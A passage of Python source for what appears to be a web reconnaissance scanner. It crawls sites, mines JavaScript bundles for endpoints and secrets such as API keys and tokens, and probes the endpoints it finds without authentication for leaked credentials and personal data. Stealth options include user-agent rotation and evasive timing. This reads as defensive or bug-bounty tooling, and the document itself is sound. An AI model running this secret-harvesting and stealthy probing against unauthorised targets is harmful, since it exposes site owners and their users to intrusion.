    "whatsapp.com", "wa.me",
    # Mastodon
    "mastodon.social",
    # Misc
    "vk.com", "weibo.com", "twitch.tv", "bsky.app",
}

# Mutable flag set by --no-social at runtime
SOCIAL_FILTER_FLAGS = {"enabled": False}

# Google tracking / Play Store domains — skipped by default, disable with --no-skip-google-tracking
SKIP_GOOGLE_TRACKING = True
_GOOGLE_TRACKING_DOMAINS = {
    "play.google.com",
    "google-analytics.com",
    "analytics.google.com",
    "googletagmanager.com",
    "googleadservices.com",
    "doubleclick.net",
}

def is_google_tracking_url(url):
    """Return True if the URL is a Google tracking or Play Store domain."""
    try:
        netloc = urlparse(url).netloc.lower()
        if netloc.startswith("www."):
            netloc = netloc[4:]
        for blocked in _GOOGLE_TRACKING_DOMAINS:
            if netloc == blocked or netloc.endswith("." + blocked):
                return True
    except Exception:
        pass
    return False

def is_social_media_domain(url):
    """Return True if the URL belongs to a known social media domain."""
    try:
        netloc = urlparse(url).netloc.lower()
        if netloc.startswith("www."):
            netloc = netloc[4:]
        for blocked in SOCIAL_MEDIA_DOMAINS:
            if netloc == blocked or netloc.endswith("." + blocked):
                return True
    except Exception:
        pass
    return False

_CONFIDENCE_CONFIRMED = "CONFIRMED"
_CONFIDENCE_LIKELY    = "LIKELY"
_CONFIDENCE_NEEDS_VER = "NEEDS VERIFICATION"

# Keywords in alert_type (upper-cased) that map to each confidence level.
# Checked in order: CONFIRMED first, then LIKELY; anything else → NEEDS VERIFICATION.
_CONF_CONFIRMED_KEYS = {
    # Credential checks with body verification
    "DEFAULT CREDENTIALS",
    # Specific file/secret exposure confirmed by body content
    "OPEN REDIRECT",
    "CRLF INJECTION",
    "PATH TRAVERSAL",
    "SSTI",
    "XXE INJECTION CONFIRMED",
    "SERVER-SIDE PROTOTYPE POLLUTION",
    "PROTOTYPE POLLUTION VIA URL",
    "SPRING BOOT ACTUATOR",
    "EXPOSED SECRET",
    "LARAVEL ENV FILE",
    "LARAVEL LOG FILE",
    "LARAVEL DEBUG MODE",
    "LARAVEL TELESCOPE",
    "LARAVEL HORIZON",
    "DJANGO DEBUG MODE",
    "RAILS INFO PROPERTIES",
    "DRUPAL SETTINGS FILE",
    "JOOMLA CONFIGURATION BACKUP",
    "WORDPRESS DEBUG LOG",
    "WORDPRESS USER ENUMERATION",
    "WORDPRESS XMLRPC",
    "WSDL SERVICE DEFINITION",
    "WEBSOCKET UNAUTHENTICATED DATA",
    "WEBSOCKET ORIGIN VALIDATION",
    "WEBSOCKET UNENCRYPTED",
    # Factual observations (header presence/absence is deterministic)
    "SECURITY HEADER",
    "MISSING SECURITY HEADER",
    "INSECURE COOKIE",
    "JWT",
    # .git/.env body-confirmed exposure
    "GIT EXPOSURE",
    "ENV FILE EXPOSED",
    "SENSITIVE FILE",
}

_CONF_LIKELY_KEYS = {
    "SUBDOMAIN TAKEOVER",
    "PROTOTYPE POLLUTION — POSSIBLE",
    "HTTP REQUEST SMUGGLING",
    "GRAPHQL INTROSPECTION",
    "CORS MISCONFIGURATION",
    "MASS ASSIGNMENT",
    "DANGEROUS HTTP METHOD",
    "WORDPRESS LOGIN PAGE",
    "DJANGO ADMIN PANEL",
    "DRUPAL ADMIN",
    "JOOMLA ADMIN",
    "RAILS MAILERS",
    "API VERSION",
    "OLDER API VERSION",
    "ZONE TRANSFER",
    "DMARC",
    "SPF",
    "DKIM",
    "ACTUATOR SHUTDOWN",
    "SPRING BOOT WHITELABEL",
}


def _infer_confidence(alert_type: str) -> str:
    """
    Derive a confidence level from the alert type string.
    Returns one of CONFIRMED / LIKELY / NEEDS VERIFICATION.
    """
    at = alert_type.upper()
    for key in _CONF_CONFIRMED_KEYS:
        if key in at:
            return _CONFIDENCE_CONFIRMED
    for key in _CONF_LIKELY_KEYS:
        if key in at:
            return _CONFIDENCE_LIKELY
    return _CONFIDENCE_NEEDS_VER


def write_to_alerts_database(alert_type, severity, target, detail, confidence=""):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        conn.execute("""CREATE TABLE IF NOT EXISTS Alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            alert_type TEXT,
            severity TEXT,
            target TEXT,
            detail TEXT,
            confidence TEXT,
            found_at TEXT
        )""")
        # Migrate existing databases that pre-date the confidence column
        try:
            conn.execute("ALTER TABLE Alerts ADD COLUMN confidence TEXT")
        except Exception:
            pass  # column already exists
        # Deduplicate — don't re-insert the same finding
        existing = conn.execute(
            "SELECT id FROM Alerts WHERE alert_type=? AND target=? AND detail=? LIMIT 1",
            (alert_type, target, detail)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO Alerts (alert_type,severity,target,detail,confidence,found_at) "
                "VALUES (?,?,?,?,?,?)",
                (alert_type, severity, target, detail, confidence, timestamp()))
    except Exception as e:
        print_error("write_to_alerts_database: " + str(e))
    finally:
        conn.close()

def alert(alert_type, severity, target, detail, redact_detail=False):
    """
    Print a high-visibility alert and persist it to the Alerts table.
    severity: CRITICAL | HIGH | MEDIUM
    redact_detail: if True, show only first 6 chars of detail in console output.
    """
    confidence = _infer_confidence(alert_type)
    display    = (detail[:6] + "*" * max(0, len(detail) - 6)) if redact_detail and len(detail) > 6 else detail
    bar        = _c("=" * 64, Fore.RED, Style.BRIGHT if severity in ("CRITICAL", "HIGH") else "")
    sev_label  = _sev_color(severity)
    conf_label = _c(confidence, Fore.GREEN if confidence == _CONFIDENCE_CONFIRMED
                    else Fore.YELLOW if confidence == _CONFIDENCE_LIKELY
                    else Fore.CYAN)
    print(f"\n{bar}")
    print(f"  {_c('!!', Fore.RED, Style.BRIGHT)} {sev_label} ALERT: {alert_type} {_c('!!', Fore.RED, Style.BRIGHT)}")
    print(f"  Target     : {target}")
    print(f"  Detail     : {display}")
    print(f"  Confidence : {conf_label}")
    print(f"  Time       : {timestamp()}")
    print(f"{bar}\n")
    write_to_alerts_database(alert_type, severity, target, detail, confidence)

def write_to_js_database(page_url, js_url, finding_type, value, context=""):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "JSFindings")
        # Migrate existing databases that pre-date the context column
        try:
            conn.execute("ALTER TABLE JSFindings ADD COLUMN context TEXT")
        except Exception:
            pass  # Column already exists
        existing = conn.execute(
            "SELECT url FROM JSFindings WHERE js_url=? AND value=? LIMIT 1",
            (js_url, value)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO JSFindings (url,js_url,finding_type,value,context,found_at) VALUES (?,?,?,?,?,?)",
                (page_url, js_url, finding_type, value, context, timestamp()))
    except Exception as e:
        print_error("write_to_js_database: " + str(e))
    finally:
        conn.close()

def _js_context(js_text, value, window=100):
    """
    Return up to window characters before and after the first occurrence of
    value in js_text, with whitespace collapsed so minified JS is readable.
    """
    idx = js_text.find(value)
    if idx == -1:
        return ""
    start = max(0, idx - window)
    end   = min(len(js_text), idx + len(value) + window)
    snippet = js_text[start:end]
    return re.sub(r'\s+', ' ', snippet).strip()


def analyse_js_bundle(page_url, js_url):
    """Download and analyse a JS bundle for endpoints, secrets, and staging URLs."""
    if js_url in _js_analysed:
        return
    _js_analysed.add(js_url)

    try:
        resp = safe_get(js_url, timeout=10)
        if not resp or resp.status_code != 200:
            return
        content_type = resp.headers.get("Content-Type", "")
        if "javascript" not in content_type and "text" not in content_type:
            return

        js_text = resp.text
        if len(js_text) < 100:
            return

        findings = 0

        # Endpoints
        for pattern in JS_ENDPOINT_PATTERNS:
            for match in re.findall(pattern, js_text):
                if len(match) > 5 and match not in ("/", "//") \
                        and not is_endpoint_noise(match):
                    ctx = _js_context(js_text, match)
                    write_to_js_database(page_url, js_url, "endpoint", match, ctx)
                    findings += 1

        # Secrets
        for pattern, secret_type in JS_SECRET_PATTERNS:
            for match in re.findall(pattern, js_text):
                val = match if isinstance(match, str) else match[0]
                if not val:
                    continue
                # Mapbox public token — INFO only, deduplicate across JS files
                if secret_type == "mapbox_public_token":
                    if val not in _mapbox_pk_seen:
                        _mapbox_pk_seen.add(val)
                        ctx = _js_context(js_text, val)
                        write_to_js_database(page_url, js_url, secret_type, val, ctx)
                        alert("MAPBOX PUBLIC TOKEN", "INFO", js_url,
                              "pk.eyJ token is a client-side public key — no server privilege", redact_detail=False)
                    continue
                if is_secret_fp(val) or is_public_key(val) or is_identifier_string(val):
                    continue
                print(timestamp() + " JS SECRET [" + secret_type + "] in " + js_url)
                ctx = _js_context(js_text, val)
                write_to_js_database(page_url, js_url, secret_type, val, ctx)
                findings += 1
                if secret_type in HIGH_SEVERITY_TYPES:
                    severity = "CRITICAL" if secret_type in {"aws_access_key", "github_token", "openai_key", "private_key", "mapbox_secret_token"} else "HIGH"
                    alert(f"EXPOSED SECRET: {secret_type}", severity, js_url, val, redact_detail=True)

        # Staging/internal URLs
        for pattern in JS_STAGING_PATTERNS:
            for match in re.findall(pattern, js_text):
                if match:
                    ctx = _js_context(js_text, match)
                    write_to_js_database(page_url, js_url, "staging_url", match, ctx)
                    findings += 1

        # S3 bucket references
        extract_and_probe_s3_buckets(js_text, js_url)

        # JWT tokens embedded in JS bundles
        scan_for_jwts(js_url, js_text)

        # Source map exposure — check header and .map path
        check_js_source_map(page_url, js_url, resp)

        # JS comment / TODO scanning — first-party JS only, explicit keywords only
        _JS_CDN_PATTERNS = re.compile(
            r'cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|'
            r'node_modules/|/vendor/|/bower_components/',
            re.IGNORECASE
        )
        _JS_COMMENT_REQUIRED = re.compile(
            r'\b(TODO|FIXME|HACK|NOTE)\b'
        )
        if not _JS_CDN_PATTERNS.search(js_url):
            _JS_COMMENT_PATTERNS = [
                re.compile(r'//[^\n]*'),
                re.compile(r'/\*.*?\*/', re.DOTALL),
            ]
            for cpat in _JS_COMMENT_PATTERNS:
                for comment in cpat.findall(js_text):
                    if _JS_COMMENT_REQUIRED.search(comment):
                        clean = " ".join(comment.split())[:200]
                        ctx = _js_context(js_text, comment[:40])
                        write_to_js_database(page_url, js_url, "comment_todo", clean, ctx)
                        findings += 1

        # Prototype pollution sink scan — first-party JS only, active-probes only
        if ACTIVE_PROBES:
            scan_js_for_prototype_pollution_sinks(page_url, js_url, js_text)

        if findings:
            print(timestamp() + " JS analysis: " + str(findings) + " findings in " + js_url)

    except Exception as e:
        print_error("analyse_js_bundle failed for " + js_url + ": " + str(e))

# Tracks all JS analysis threads so main_crawler can join them before the
# final endpoint probe (ensures all endpoints are in the DB before probing).
_js_analysis_threads = []
_js_analysis_threads_lock = threading.Lock()

def extract_and_analyse_js(page_url, html_content):
    """Find all script src tags in a page and analyse each JS bundle."""
    try:
        soup = BeautifulSoup(html_content, "lxml")
        base = "{0.scheme}://{0.netloc}".format(urlparse(page_url))
        for tag in soup.find_all("script", src=True):
            src = tag["src"]
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                src = base + src
            elif not src.startswith("http"):
                continue
            # Skip obvious third-party analytics/tracking
            skip = ["google", "facebook", "twitter", "analytics", "gtag",
                    "hotjar", "intercom", "segment", "hubspot", "clarity"]
            if any(s in src for s in skip):
                continue
            t = threading.Thread(target=analyse_js_bundle, args=(page_url, src), daemon=True)
            t.start()
            with _js_analysis_threads_lock:
                _js_analysis_threads.append(t)
    except Exception as e:
        print_error("extract_and_analyse_js: " + str(e))

# ─────────────────────────────────────────────
# JS endpoint auto-probe
# ─────────────────────────────────────────────

# Response patterns that confirm sensitive data is being leaked
_JS_EP_SENSITIVE = [
    (re.compile(r'"password"\s*:\s*"[^"]{1,}"',     re.I), "password field with value"),
    (re.compile(r'"passwd"\s*:\s*"[^"]{1,}"',        re.I), "passwd field with value"),
    (re.compile(r'"secret"\s*:\s*"[^"]{8,}"',        re.I), "secret field with value"),
    (re.compile(r'"(?:api_?key|apikey)"\s*:\s*"[^"]{8,}"', re.I), "API key field"),
    (re.compile(r'"(?:access_?token|auth_?token|bearer_?token)"\s*:\s*"[^"]{8,}"', re.I), "auth token field"),
    (re.compile(r'"(?:ssn|social_security_?number)"\s*:', re.I), "SSN field"),
    (re.compile(r'"credit_?card(?:_?number)?"\s*:',  re.I), "credit card field"),
    (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY', re.I), "private key"),
    (re.compile(r'Traceback \(most recent call last\)', re.I), "Python stack trace"),
    (re.compile(r'at\s+[\w.$]+\s+\([\w./]+:\d+:\d+\)', re.I), "JS stack trace"),
    (re.compile(r'(?:SQLException|ORA-\d{5}|SQLSTATE\[|mysql_fetch|pg_query)', re.I), "SQL error"),
    (re.compile(r'"(?:is_admin|isAdmin)"\s*:\s*true', re.I), "admin:true flag"),
    (re.compile(r'"role"\s*:\s*"admin"',             re.I), "admin role"),
]

_js_endpoint_probed      = set()
_js_endpoint_probed_lock = threading.Lock()

def _resolve_endpoint(endpoint, page_url):
    """Convert a relative or protocol-relative endpoint to a full URL."""
    if endpoint.startswith(("http://", "https://")):
        return endpoint
    if endpoint.startswith("//"):
        scheme = urlparse(page_url).scheme or "https"
        return scheme + ":" + endpoint
    parsed = urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    return origin + (endpoint if endpoint.startswith("/") else "/" + endpoint)

def probe_js_endpoints(base_url=None):
    """
    Probe all API endpoints stored in JSFindings (finding_type='endpoint')
    using unauthenticated GET requests.

    Severity mapping:
      HIGH   — HTTP 200 + sensitive data pattern (token, password field, stack trace, SQL error)
      MEDIUM — HTTP 200 + JSON array with >10 items (potential unauthenticated data dump)
      LOW    — HTTP 200 + JSON object (accessible without auth, verify manually)
      LOW    — HTTP 500 (server error on unauthenticated probe)
      skip   — HTTP 401/403 (exists but protected — expected)

    When base_url is provided, only probes endpoints whose resolved host matches
    that origin (used when called per-domain during enrichment).
    """
    try:
        conn = sqlite3.connect("ScrapeDB")
        rows = conn.execute(
            "SELECT value, url FROM JSFindings WHERE finding_type='endpoint'"
        ).fetchall()
        conn.close()
    except Exception as e:
        print_error(f"probe_js_endpoints: DB query failed: {e}")
        return

    if not rows:
        return

    base_netloc = urlparse(base_url).netloc if base_url else None

    to_probe = []
    seen_this_call = set()
    for endpoint, page_url in rows:
        try:
            full_url = _resolve_endpoint(endpoint, page_url or "")
            if not full_url.startswith("http"):
                continue
            with _js_endpoint_probed_lock:
                already = full_url in _js_endpoint_probed
            if already or full_url in seen_this_call:
                continue
            if base_netloc and urlparse(full_url).netloc != base_netloc:
                continue
            if not is_in_scope(full_url):
                continue
            seen_this_call.add(full_url)
            to_probe.append((full_url, page_url))
        except Exception:
            continue

    if not to_probe:
        return

    print(timestamp() + f" Probing {len(to_probe)} JS-discovered endpoints unauthenticated...")

    def _probe(full_url, page_url):
        with _js_endpoint_probed_lock:
            _js_endpoint_probed.add(full_url)
        try:
            resp = safe_get(full_url, timeout=8)
            if not resp:
                return
            status = resp.status_code

            if status == 200:
                body  = resp.text
                size  = len(body)
                ctype = resp.headers.get("Content-Type", "").lower()

                # Sensitive data patterns — HIGH
                for pattern, desc in _JS_EP_SENSITIVE:
                    if pattern.search(body):
                        alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "HIGH", full_url,
                              f"Unauthenticated GET returned HTTP 200 containing {desc}")
                        print(timestamp() + f" [!!] JS endpoint leaks {desc}: {full_url}")
                        return

                # Email addresses in response — severity based on count and specificity
                _GENERIC_PREFIXES = {'support', 'info', 'admin', 'contact', 'hello', 'noreply',
                                     'no-reply', 'help', 'sales', 'team'}
                found_emails = [e for e in re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body)
                                if _is_real_email(e)]
                unique_emails = list(set(found_emails))
                non_generic = [e for e in unique_emails if e.split('@')[0].lower() not in _GENERIC_PREFIXES]
                if len(non_generic) >= 3:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "HIGH", full_url,
                          f"Unauthenticated GET returned {len(non_generic)} non-generic email addresses")
                    print(timestamp() + f" [!!] JS endpoint exposes email list ({len(non_generic)} addresses): {full_url}")
                    return
                elif len(non_generic) >= 1:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "MEDIUM", full_url,
                          f"Unauthenticated GET returned {len(non_generic)} non-generic email address(es)")
                    print(timestamp() + f"  JS endpoint exposes email(s) ({len(non_generic)} non-generic): {full_url}")
                    return
                elif len(unique_emails) >= 5:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "LOW", full_url,
                          f"Unauthenticated GET returned {len(unique_emails)} generic/public email addresses")
                    print(timestamp() + f"  JS endpoint exposes generic emails ({len(unique_emails)}): {full_url}")
                    return

                # Large JSON array — potential data dump — MEDIUM
                stripped = body.strip()
                if stripped.startswith("["):
                    try:
                        data = json.loads(stripped)
                        if isinstance(data, list) and len(data) > 10:
                            alert("JS ENDPOINT — UNAUTHENTICATED DATA ACCESS", "MEDIUM", full_url,
                                  f"Unauthenticated GET returned JSON array with {len(data)} items ({size:,} bytes)")
                            print(timestamp() + f"  JS endpoint data dump ({len(data)} items): {full_url}")
                            return
                    except Exception:
                        pass

                # JSON object response — LOW
                if size > 128 and ("json" in ctype or stripped.startswith("{")):
                    alert("JS ENDPOINT — ACCESSIBLE UNAUTHENTICATED", "LOW", full_url,
                          f"Unauthenticated GET returned HTTP 200 JSON ({size:,} bytes) — verify auth requirement")

            elif status == 500:
                alert("JS ENDPOINT — SERVER ERROR", "LOW", full_url,
                      "Unauthenticated GET returned HTTP 500 — possible unhandled exception or missing input validation")

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"probe_js_endpoints: probe failed for {full_url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe, url, page) for url, page in to_probe]
        for f in as_completed(futures):
            pass
    print(timestamp() + f" JS endpoint probe complete — {len(to_probe)} probed.")


# ─────────────────────────────────────────────
# JavaScript source map exposure
# ─────────────────────────────────────────────

# Deduplicate across the session — each JS URL checked at most once
_source_map_checked = set()

def check_js_source_map(page_url, js_url, js_response=None):
    """
    Probe for exposed JavaScript source maps.

    Checks:
      1. SourceMap / X-SourceMap response header on the JS file itself
         (explicitly points to the map location — most authoritative)
      2. <js_url>.map — the conventional naming convention used by all
         major bundlers (webpack, esbuild, Rollup, Vite, Parcel)

    Exposed source maps leak the original unminified source code, internal
    file paths, variable/function names, and occasionally inline comments
    that contain credentials or architecture notes.

    Confirmation: response body must contain the required JSON fields
    ("version", "mappings", "sources") to avoid false positives from
    catch-all 200 handlers.
    """
    if js_url in _source_map_checked:
        return
    _source_map_checked.add(js_url)

    map_candidates = []

    # Priority 1: explicit header reference
    if js_response:
        for header in ("SourceMap", "X-SourceMap"):
            ref = js_response.headers.get(header) or js_response.headers.get(header.lower())
            if ref:
                if ref.startswith("http"):
                    map_candidates.append(ref)
                else:
                    base = js_url.rsplit("/", 1)[0]
                    map_candidates.append(base + "/" + ref.lstrip("/"))

    # Priority 2: conventional .map path
    map_candidates.append(js_url + ".map")

    seen = set()
    for map_url in map_candidates:
        if map_url in seen:
            continue
        seen.add(map_url)
        try:
            stealth_delay(urlparse(map_url).netloc)
            resp = _get_session().get(
                map_url, headers=create_request_header(),
                timeout=6, allow_redirects=False,
            )
            if not resp or resp.status_code not in (200, 206):
                continue

            # Confirm it's a real source map — must have all three required fields
            body = resp.text[:4000]
            if not ('"version"' in body and '"mappings"' in body and '"sources"' in body):
                continue

            # Extract source file list for the alert detail (first 3 paths)
            source_files = re.findall(r'"sources"\s*:\s*\[([^\]]{0,300})', body)
            detail_suffix = ""
            if source_files:
                paths = re.findall(r'"([^"]{3,80})"', source_files[0])[:3]
                if paths:
                    detail_suffix = " — source paths include: " + ", ".join(paths)

            alert(
                "JAVASCRIPT SOURCE MAP EXPOSED",
                "HIGH",
                js_url,
                f"Source map at {map_url} leaks unminified source, file paths, and variable names{detail_suffix}"
            )
            print(timestamp() + f" [!!] JS source map exposed: {map_url}")
            write_to_js_database(page_url, js_url, "source_map", map_url)

        except Exception as e:
            print_error(f"check_js_source_map failed for {map_url}: {e}")

# ─────────────────────────────────────────────
# Playwright JS rendering
# ─────────────────────────────────────────────

# Per-thread persistent browser — each thread owns one browser for its lifetime
_pw_semaphore = threading.Semaphore(PLAYWRIGHT_MAX_CONC)
_pw_local     = threading.local()


def _get_pw_thread_browser():
    """Return the per-thread Playwright browser, launching it on first use."""
    if not getattr(_pw_local, 'browser', None):
        import os
        exe = os.environ.get("PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH", None)
        pw  = sync_playwright().start()
        browser = pw.chromium.launch(
            executable_path=exe,
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--single-process",
            ],
        )
        _pw_local.pw      = pw
        _pw_local.browser = browser
    return _pw_local.browser

# JS frameworks that definitely need Playwright
JS_FRAMEWORKS = {"React", "Angular", "Vue.js", "Next.js", "Nuxt.js", "Gatsby", "Svelte"}

def is_js_heavy(html_bytes, detected_techs=None):
    """
    Returns True if the page is likely a JS-rendered SPA that needs Playwright.
    Checks:
      1. Known JS framework in detected_techs
      2. Very little visible text vs total HTML size (SPA shell pattern)
      3. Presence of common SPA root mount points with no content
    """
    if detected_techs and JS_FRAMEWORKS.intersection(set(detected_techs)):
        return True
    if not html_bytes or len(html_bytes) < JS_CONTENT_MIN:
        return True
    try:
        soup = BeautifulSoup(html_bytes, "lxml")
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(separator=" ").strip()
        # If visible text is less than 5% of total HTML, it's probably a shell
        if len(text) < len(html_bytes) * 0.05:
            return True
        # Common SPA mount point patterns with no children
        for mount_id in ["root", "app", "__next", "__nuxt", "gatsby-focus-wrapper"]:
            el = soup.find(id=mount_id)
            if el and not el.get_text(strip=True):
                return True
    except Exception:
        pass
    return False

def write_to_xhr_database(page_url, endpoint, method):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "XHREndpoints")
        existing = conn.execute(
            "SELECT url FROM XHREndpoints WHERE url=? AND endpoint=? LIMIT 1",
            (page_url, endpoint)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO XHREndpoints (url,endpoint,method,found_at) VALUES (?,?,?,?)",
                (page_url, endpoint, method, timestamp()))
    except Exception as e:
        print_error("write_to_xhr_database: " + str(e))
    finally:
        conn.close()

def playwright_fetch(url):
    """
    Render a page with Playwright using a per-thread persistent browser instance.
    Each thread initializes its own browser on first use and reuses it for all
    subsequent calls, avoiding the 5-8s cold-start per page.
    Returns (html_bytes, xhr_endpoints).
    """
    if not PLAYWRIGHT_AVAILABLE:
        print_error("Playwright not installed — run: pip install playwright && playwright install chromium")
        return None, []

    xhr_endpoints = []
    html_bytes    = None

    with _pw_semaphore:
        ctx  = None
        page = None
        try:
            browser = _get_pw_thread_browser()
            print(timestamp() + " Playwright rendering: " + url)
            _ctx_headers = stealth_headers({})
            _ctx_extra = {k: v for k, v in _ctx_headers.items() if k != "User-Agent"}
            if BUG_BOUNTY_HEADER:
                _ctx_extra["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
            ctx  = browser.new_context(
                user_agent=random.choice(UA_POOL),
                extra_http_headers=_ctx_extra,
                ignore_https_errors=True,
                java_script_enabled=True,
            )
            page = ctx.new_page()
            if PLAYWRIGHT_STEALTH_AVAILABLE:
                Stealth().apply_stealth_sync(page)

            def on_request(req):
                if req.resource_type in ("xhr", "fetch"):
                    skip = ["google-analytics", "googletagmanager", "facebook",
                            "doubleclick", "hotjar", "segment", "mixpanel",
                            "amplitude", "intercom", "hubspot", "clarity.ms"]
                    if not any(s in req.url for s in skip):
                        xhr_endpoints.append((req.url, req.method))
                        print(timestamp() + " XHR: " + req.method + " " + req.url)

            page.on("request", on_request)

            page.goto(url, timeout=PLAYWRIGHT_TIMEOUT, wait_until="domcontentloaded")
            try:
                page.wait_for_load_state("networkidle", timeout=4000)
            except PlaywrightTimeout:
                pass

            for _ in range(4):
                page.evaluate("window.scrollBy(0, window.innerHeight)")
                page.wait_for_timeout(500)
            page.evaluate("window.scrollTo(0, 0)")

            html_bytes = page.content().encode("utf-8", errors="ignore")
            print(timestamp() + " Playwright got " + str(len(html_bytes)) + " bytes from " + url)

        except PlaywrightTimeout:
            print_error("Playwright page timeout: " + url)
        except Exception as e:
            print_error("Playwright page error on " + url + ": " + str(e))
        finally:
            if page:
                try:
                    page.close()
                except Exception:
                    pass
            if ctx:
                try:
                    ctx.close()
                except Exception:
                    pass

    return html_bytes, xhr_endpoints

# ─────────────────────────────────────────────
# Async crawler
# ─────────────────────────────────────────────

async def async_fetch(session, url, semaphore):
    async with semaphore:
        _t0 = time.monotonic()
        try:
            if STEALTH_PROFILE == "NORMAL":
                await asyncio.sleep(random.uniform(0.5, 1.5))
            elif STEALTH_PROFILE == "GHOST":
                await asyncio.sleep(random.uniform(2.0, 6.0))
            headers = create_request_header()
            timeout = aiohttp.ClientTimeout(total=ASYNC_TIMEOUT, connect=5)
            async with session.get(url, headers=headers, timeout=timeout) as response:
                status = response.status
                record_http_response(url, status)
                if status == 429:
                    elapsed = time.monotonic() - _t0
                    await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                    return url, None, {}, elapsed, True, True   # (url, html, hdrs, elapsed, is_error, is_429)
                if status == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'xml' in content_type and 'html' not in content_type:
                        elapsed = time.monotonic() - _t0
                        await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                        return url, None, {}, elapsed, False, False
                    html = await response.read()
                    elapsed = time.monotonic() - _t0
                    await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                    return url, html, dict(response.headers), elapsed, False, False
        except asyncio.TimeoutError:
            print_error("Timeout fetching: " + url)
        except aiohttp.ClientError as e:
            print_error("Async fetch failed for " + url + ": " + str(e))
        except Exception as e:
            print_error("Unexpected error fetching " + url + ": " + str(e))
        elapsed = time.monotonic() - _t0
        await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
        return url, None, {}, elapsed, True, False

async def crawl_batch(urls, concurrency=None):
    if concurrency is None:
        concurrency = _ac.workers
    semaphore = asyncio.Semaphore(max(1, concurrency))
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(
        connector=connector,
        max_line_size=32768,
        max_field_size=32768,
    ) as session:
        tasks = [async_fetch(session, url, semaphore) for url in urls]
        return await asyncio.gather(*tasks, return_exceptions=False)

def parse_anchors_from_html(html_content):
    try:
        parsed = BeautifulSoup(html_content, "lxml")
        return parsed.find_all(lambda tag: tag.name == 'a' and tag.get('href'))
    except Exception:
        return []

def is_in_scope(url):
    """Return True if url is on the same domain as the scan target when SAME_DOMAIN_ONLY is set."""
    if not SAME_DOMAIN_ONLY:
        return True
    try:
        target_host = urlparse(START_URL).netloc.lstrip("www.")
        url_host    = urlparse(url).netloc.lstrip("www.")
        return url_host == target_host or url_host.endswith("." + target_host)
    except Exception:
        return False

def _clean_url(url):
    """Strip trailing punctuation that can bleed into URLs from surrounding text."""
    return url.rstrip(")>]")

def get_domain_names(anchors, url_queue, url_seen, base_netloc, same_domain_only):
    new_domains = []
    try:
        for a in anchors:
            href = _clean_url(a.get("href", ""))
            if not href.startswith("http"):
                continue
            if href in url_seen:
                continue
            parsed_href = urlparse(href)
            if same_domain_only and parsed_href.netloc != base_netloc:
                continue
            if SOCIAL_FILTER_FLAGS["enabled"] and is_social_media_domain(href):
                continue
            if SKIP_GOOGLE_TRACKING and is_google_tracking_url(href):
                continue
            url_seen.add(href)
            priority = _url_priority(href)
            _pq_push(url_queue, href)
            if priority == 1:
                print(timestamp() + " [P1] High-value URL queued: " + href)
            if href.endswith((".com", ".gov/", ".net/", ".edu/", ".org/",
                               ".io/", ".co.uk/", ".ie/", ".info/")):
                new_domains.append(href)
    except TypeError as err:
        print_error("get_domain_names: " + str(err))
    return new_domains

# ─────────────────────────────────────────────
# Database
# ─────────────────────────────────────────────

def create_db(conn, table_name):
    table_creation_map = {
        "Domains":         '''CREATE TABLE IF NOT EXISTS Domains (url TEXT NOT NULL, ip TEXT NOT NULL, servertype TEXT, content_type TEXT, title TEXT)''',
        "Emails":          '''CREATE TABLE IF NOT EXISTS Emails (email_address TEXT NOT NULL)''',
        "DNS":             '''CREATE TABLE IF NOT EXISTS DNS (domain TEXT NOT NULL, ip TEXT NOT NULL)''',
        "MX":              '''CREATE TABLE IF NOT EXISTS MX (domain TEXT NOT NULL, mx_host TEXT NOT NULL, preference INTEGER)''',
        "SSL":             '''CREATE TABLE IF NOT EXISTS SSL (domain TEXT NOT NULL, common_name TEXT, issuer TEXT, not_before TEXT, not_after TEXT)''',
        "WHOIS":           '''CREATE TABLE IF NOT EXISTS WHOIS (domain TEXT NOT NULL, registrar TEXT, creation_date TEXT, expiration_date TEXT)''',
        "Ports":           '''CREATE TABLE IF NOT EXISTS Ports (domain TEXT NOT NULL, ip TEXT NOT NULL, port INTEGER NOT NULL)''',
        "HTTPHistory":     '''CREATE TABLE IF NOT EXISTS HTTPHistory (url TEXT NOT NULL, status_code INTEGER NOT NULL, checked_at TEXT NOT NULL)''',
        "Technologies":    '''CREATE TABLE IF NOT EXISTS Technologies (url TEXT NOT NULL, technology TEXT NOT NULL)''',
        "Robots":          '''CREATE TABLE IF NOT EXISTS Robots (base_url TEXT NOT NULL, content TEXT NOT NULL, fetched_at TEXT NOT NULL)''',
        "Sitemap":         '''CREATE TABLE IF NOT EXISTS Sitemap (base_url TEXT NOT NULL, url TEXT NOT NULL)''',
